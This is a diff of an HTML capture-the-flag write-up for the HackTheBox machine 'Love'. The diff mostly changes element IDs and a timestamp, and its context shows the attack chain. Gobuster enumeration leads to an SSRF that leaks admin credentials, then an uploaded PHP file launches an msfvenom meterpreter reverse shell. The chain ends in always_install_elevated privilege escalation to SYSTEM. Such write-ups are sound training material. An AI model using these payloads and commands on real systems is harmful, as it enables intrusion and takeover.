@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-07-31 Sun 00:56 -->
+<!-- 2022-10-31 Mon 22:34 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>HTB | Love</title>
@@ -52,12 +52,12 @@
 <li><a href="#org8addbcc">2.2.1. Virtual host enumeration</a></li>
 <li><a href="#orga4873aa">2.2.2. Enumerating <code>http://love.htb</code></a>
 <ul>
-<li><a href="#orgb812771">2.2.2.1. Gobuster</a></li>
+<li><a href="#org09651b3">2.2.2.1. Gobuster</a></li>
 </ul>
 </li>
 <li><a href="#org5864660">2.2.3. Enumerating <code>http://staging.love.htb</code></a>
 <ul>
-<li><a href="#org4a3dcbb">2.2.3.1. Gobuster</a></li>
+<li><a href="#org7b059e6">2.2.3.1. Gobuster</a></li>
 <li><a href="#org4bd8449">2.2.3.2. <code>/beta.php</code></a></li>
 </ul>
 </li>
@@ -116,7 +116,7 @@ I used the following command to enumerate all open ports, and check which versio
 $ sudo nmap -sV -p- -oA nmap/version_scan_all_ports 10.129.48.103
 </pre>
 
-<pre class="example" id="org7660460">
+<pre class="example" id="org9f9e173">
 # Nmap 7.91 scan initiated Sun Jul 25 20:11:00 2021 as: nmap -sV -p- -oA nmap/version_scan_all_ports 10.129.48.103
 Nmap scan report for 10.129.48.103
 Host is up (0.035s latency).
@@ -325,7 +325,7 @@ So let's start <code>gobuster</code> in virtual host mode and start enumerating.
 <p>
 For this enumeration I used the <code>subdomains-top1million-20000.txt</code> DNS wordlist from the <a href="https://github.com/danielmiessler/SecLists">SecLists repository</a>.<br>
 </p>
-<pre class="example" id="org583a5ee">
+<pre class="example" id="org1ae1e58">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/love ]
 └─&gt; $ gobuster vhost -u "http://love.htb" -w ~/repositories/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 ===============================================================
@@ -372,7 +372,7 @@ Let's start enumerating files and directories with <code>gobuster</code>.<br>
 As you can see on the image below, there isn't a lot we can do regarding the homepage of this site.<br>
 </p>
 
-<figure id="org42df96c">
+<figure id="orgdfce0ff">
 <img src="assets/2021-07-25_20-13-13_screenshot.png" alt="2021-07-25_20-13-13_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 1: </span>Index of <code>http://love.htb</code></figcaption>
@@ -382,10 +382,10 @@ As you can see on the image below, there isn't a lot we can do regarding the hom
 Let us start by enumerating the main site using <code>gobuster</code>, and hope that we get something more useful than that login page.<br>
 </p>
 </div>
-<div id="outline-container-orgb812771" class="outline-5">
-<h5 id="orgb812771"><span class="section-number-5">2.2.2.1.</span> Gobuster</h5>
+<div id="outline-container-org09651b3" class="outline-5">
+<h5 id="org09651b3"><span class="section-number-5">2.2.2.1.</span> Gobuster</h5>
 <div class="outline-text-5" id="text-2-2-2-1">
-<pre class="example" id="orgb51d077">
+<pre class="example" id="org3a895f4">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/love ]
 └─&gt; $ gobuster dir -u "http://love.htb" -w ~/repositories/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -b 403,404 -x php -d                                                                                             20:55
 ===============================================================
@@ -442,14 +442,14 @@ There is a user input, but looking at the source code of the page we'll see that
 Just to be sure that we don't miss anything, I'll enumerate this server with <code>gobuster</code>.<br>
 </p>
 </div>
-<div id="outline-container-org4a3dcbb" class="outline-5">
-<h5 id="org4a3dcbb"><span class="section-number-5">2.2.3.1.</span> Gobuster</h5>
+<div id="outline-container-org7b059e6" class="outline-5">
+<h5 id="org7b059e6"><span class="section-number-5">2.2.3.1.</span> Gobuster</h5>
 <div class="outline-text-5" id="text-2-2-3-1">
 <p>
 As can be seen on the results below, there isn't anything of interest except for <code>/beta.php</code>.<br>
 So let us take a closer look at that!<br>
 </p>
-<pre class="example" id="org28bd66f">
+<pre class="example" id="org02f0ff5">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/love ]
 └─&gt; $ gobuster dir -u "http://staging.love.htb" -w ~/repositories/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php -d -b 404,403 -o gobuster/staging.love.htb
 ===============================================================
@@ -486,7 +486,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 This accepts a url pointing to a specific file somewhere on the internet.<br>
 </p>
 
-<figure id="org0b0516e">
+<figure id="org892c408">
 <img src="./assets/2021-07-25_23-45-36_screenshot.png" alt="2021-07-25_23-45-36_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 2: </span>Image of <code>/beta.php</code></figcaption>
@@ -516,7 +516,7 @@ So let us begin attacking this box, by first gaining access to the voting system
 If we point the site to <code>http://127.0.0.1/index.php</code>, we will see that some of the target website is rendered.<br>
 </p>
 
-<figure id="orgd016b13">
+<figure id="org028c8e6">
 <img src="assets/2021-07-26_00-05-39_screenshot.png" alt="2021-07-26_00-05-39_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 3: </span>SSRF pointing to voter login page</figcaption>
@@ -525,7 +525,7 @@ If we point the site to <code>http://127.0.0.1/index.php</code>, we will see tha
 <p>
 The entire request sent by the form can be seen below.<br>
 </p>
-<pre class="example" id="org2360304">
+<pre class="example" id="orgdd75bfd">
 POST http://staging.love.htb/beta.php HTTP/1.1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
@@ -549,7 +549,7 @@ file=http%3A%2F%2F127.0.0.1%2Findex.php&amp;read=Scan+file
 Let's us try the webserver running on port <code>5000</code>, just to see if there is anything interesting.<br>
 </p>
 
-<figure id="org3816385">
+<figure id="orgc396dcc">
 <img src="assets/2021-07-26_00-14-56_screenshot.png" alt="2021-07-26_00-14-56_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 4: </span>Scanning <code>http://127.0.0.1:5000/index.php</code></figcaption>
@@ -572,7 +572,7 @@ Now that we have the username and password for the admin area of the voting syst
 Logging in as <code>admin</code> gives the following interface<br>
 </p>
 
-<figure id="org99af6cb">
+<figure id="org6bf906f">
 <img src="assets/2021-07-26_00-26-15_screenshot.png" alt="2021-07-26_00-26-15_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 5: </span>Admin interface for voting system</figcaption>
@@ -614,7 +614,7 @@ And since we are already admin, there is not a that we could gain from this.<br>
 There was also an error in the implementation of SQL, but I couldn't put it to any use.<br>
 </p>
 
-<figure id="orga589d25">
+<figure id="org80ac31d">
 <img src="assets/2021-07-26_00-54-21_screenshot.png" alt="2021-07-26_00-54-21_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 6: </span>Error in SQL syntax</figcaption>
@@ -623,7 +623,7 @@ There was also an error in the implementation of SQL, but I couldn't put it to a
 <p>
 The parameter vulnerable to SQL injection was the <code>plaform</code> parameter shown in the POST request below.<br>
 </p>
-<pre class="example" id="org7ea829e">
+<pre class="example" id="org56a31f9">
 POST http://love.htb/admin/candidates_edit.php HTTP/1.1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
@@ -686,7 +686,7 @@ exec("shell.exe");
 <p>
 The meterpreter shell is generated using the <code>msfvenom</code><br>
 </p>
-<pre class="example" id="org13ec72d">
+<pre class="example" id="org01bbee1">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/love/shells ]
 └─&gt; $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.87 LPORT=4444 -f exe &gt; shell.exe                15:37
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -704,7 +704,7 @@ And a handler setup in <code>msfconsole</code> with options matching the ones in
 Now we upload both files, and navigate to the php file.<br>
 And voila we have a shell!<br>
 </p>
-<pre class="example" id="org9716d29">
+<pre class="example" id="org8582f0a">
 meterpreter &gt; getuid
 Server username: LOVE\Phoebe
 meterpreter &gt;
@@ -713,7 +713,7 @@ meterpreter &gt;
 <p>
 Let's navigate to the desktop and get the flag!<br>
 </p>
-<pre class="example" id="orgcd3ec30">
+<pre class="example" id="org46588b6">
 meterpreter &gt; cd Desktop
 meterpreter &gt; ls
 Listing: C:\Users\Phoebe\Desktop
@@ -748,7 +748,7 @@ Since this is done through meterpreter, we can use a lot of modules from metaspl
 <p>
 This is a very nifty little module, which will suggest local exploits that can be used to elevate privileges.<br>
 </p>
-<pre class="example" id="orga372fcc">
+<pre class="example" id="orgb20312f">
 meterpreter &gt; run post/multi/recon/local_exploit_suggester
 
 [*] 10.129.148.112 - Collecting local exploits for x86/windows...
@@ -772,7 +772,7 @@ As you can see the target is vulnerable to the <code>always_install_elevated</co
 Since the autosuggester mentioned this exploit, let's test if it is correct.<br>
 This is done by running the following commands:<br>
 </p>
-<pre class="example" id="orgea17412">
+<pre class="example" id="org5be35f5">
 meterpreter &gt; shell
 Process 6380 created.
 Channel 6 created.
@@ -802,7 +802,7 @@ The registrykeys are enabled meaning we are vulnerable, just as the <code>local_
 <p>
 Now we can run the exploit module:<br>
 </p>
-<pre class="example" id="orgec7c737">
+<pre class="example" id="org7832053">
 meterpreter &gt; run exploit/windows/local/always_install_elevated LHOST=10.10.14.87
 
 [*] Started reverse TCP handler on 10.10.14.87:4444
@@ -820,7 +820,7 @@ And a session was created, which means we have root!<br>
 <p>
 Now all we need is to switch to that session, and read the root flag.<br>
 </p>
-<pre class="example" id="orgffffa8d">
+<pre class="example" id="org7d4f4bb">
 meterpreter &gt; getuid
 Server username: NT AUTHORITY\SYSTEM
 meterpreter &gt; pwd
